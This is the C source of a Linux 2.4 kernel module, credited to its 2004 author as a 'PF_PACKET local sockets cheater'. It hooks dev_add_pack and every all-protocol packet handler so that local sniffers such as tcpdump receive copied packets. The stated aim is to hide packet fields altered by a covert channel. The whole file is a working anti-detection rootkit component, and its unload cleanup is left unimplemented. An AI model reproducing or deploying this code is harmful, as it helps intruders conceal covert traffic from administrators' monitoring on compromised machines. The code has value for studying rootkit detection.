/*
 * PF_PACKET local sockets cheater
 * shoule be used togegther with one of the passive cover channles
 * to cirumvent detection of altered fields in incoming packets by local
 * tcpdump or other sniffer which uses PF_PACKET sockets
 *
 * designed for 2.4 kernels. Can be easy ported to 2.6 as well.
 *
 * (c) joanna, 2004.
 *
 * joanna at invisiblethings dot org
 *
 * credits to mayhem for writing LKH library 
 *
 */

#define MODULE
#define __KERNEL__

#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/kernel.h>
#include <linux/module.h>
#include <net/tcp.h>
#include <net/ip.h>

#include "lkh.h"
//#define DEBUG

#ifdef DEBUG 
#define dbgprintk(x...) printk (x) 
#else
#define dbgprintk(x...) 
#endif


int devaddpack_addr = (int) dev_add_pack;
hook_t *devaddpack_hook;


struct pt_hook_info {
  int (*orig_func) (struct sk_buff *skb, struct net_device *dev, struct packet_type *pt); 
  void *orig_data;
};


int cc_packet_rcv (struct sk_buff *skb, struct net_device *dev, struct packet_type *pt) {
  struct pt_hook_info *pthi = (struct pt_hook_info*) pt->data;
  if (!pthi) {
    printk ("cc_packet_rcv: pt->data is NULL!\n");
    return 0;
  }
  pt->data = pthi->orig_data;
  int ret;
  
  if (skb->pkt_type == PACKET_HOST && pt->data != (void*)0xbabe) {
    struct sk_buff * skb2 = skb_copy (skb, GFP_ATOMIC); 
    if (!skb2) {
      printk ("cc_packet_rcv: skb2 cannot be allocated!\n");
      return 0;
    }

    kfree_skb (skb);
    ret = pthi->orig_func (skb2, dev, pt);
  }  
  else ret = pthi->orig_func (skb, dev, pt);

  if (pthi->orig_data != pt->data) 
    printk ("STRANGE: orig_func modified pt->data!\n");

  pthi->orig_data = pt->data; // just in case orig_func modified pt->data
  pt->data = (void*) pthi;
  return ret;
}

void hook_ptype (struct packet_type *pt) {
  struct pt_hook_info *pthi = kmalloc (sizeof (struct pt_hook_info), GFP_KERNEL);	
  //FIXME: kfree (pthi) somewhere;)

  if (!pthi) {
    printk ("hook_ptype(): pt_hook_info cannot be allocated!\n");
    return;
  }
  pthi->orig_func = pt->func;
  pthi->orig_data = pt->data;

  pt->func = cc_packet_rcv;
  pt->data = (void*)pthi;

}

void cc_dev_add_pack (void *ptr) {
  struct packet_type *pt = *((struct packet_type**)ptr);
  
  dbgprintk ("cc_dev_add_pack (pt = %#x, pt->type = %#x, pt->func = %#x)\n", 
      pt, pt->type, pt->func);

  if (pt->type == htons (ETH_P_ALL) && pt->func != cc_packet_rcv) 
    hook_ptype (pt);
 
  
}

int dummy_handler (struct sk_buff *skb, struct net_device *dev, struct packet_type *pt) {
  return 0;
}


int usage () {
  return -EINVAL;
} 


int init_module() {
  // first, check all existing handlers on ptype_all list

  // a little trick to locate ptype_all list ;)
  struct packet_type dummy_pt;
  dummy_pt.func = dummy_handler;
  dummy_pt.type = htons (ETH_P_ALL);
  dummy_pt.data = NULL;
  dummy_pt.dev  = NULL;
  dev_add_pack (&dummy_pt);
  // NOTE: dev_add_pack always inserts new element at the beggining of the list:)
  // NOTE: on 2.6 there is a double linked list, so this should not be a problem either

  // traverse ptype_all list
  struct packet_type *pt;
  for (pt = dummy_pt.next; pt; pt = pt->next) {
    dbgprintk ("Found pt handler at %#x (data = %#x) ", pt->func, pt->data);
    if (pt->func != cc_packet_rcv && pt->data != (void*)0xbabe) {
      hook_ptype (pt);
      dbgprintk ("(hooking)\n");
    } else dbgprintk ("(skipping)\n");
	

  }
  
  dev_remove_pack (&dummy_pt);

  // and finally hook dev_add_pack, to catch all future handler regsitrations...
  
  if (!devaddpack_addr) {
    printk ("Cannot resolve address of dev_add_pack()!\n");
    return -ENXIO;
  }

  devaddpack_hook = khook_create (devaddpack_addr,
      HOOK_PERMANENT | HOOK_DISCRETE | HOOK_ENABLED);

  if (!devaddpack_hook) {
    printk ("khook_create returned NULL!\n");
    return -ENXIO;
  }

  dbgprintk ("dev_add_pack         : %#x\n", devaddpack_addr);
  dbgprintk ("cc_dev_add_pack addr : %#x\n", (unsigned long) cc_dev_add_pack);
  dbgprintk ("cc_packet_rcv addr   : %#x\n", (unsigned long) cc_packet_rcv);

  khook_add_entry (devaddpack_hook, (int) cc_dev_add_pack, 0);
  dbgprintk ("dev_add_pack has been hooked.\n");

  return 0;
}
void cleanup_module() {

  // FIXME: travers all ptype_all list and revert references to cc_dev_add_pack(), before
  // unloading the module
}

MODULE_LICENSE("GPL");


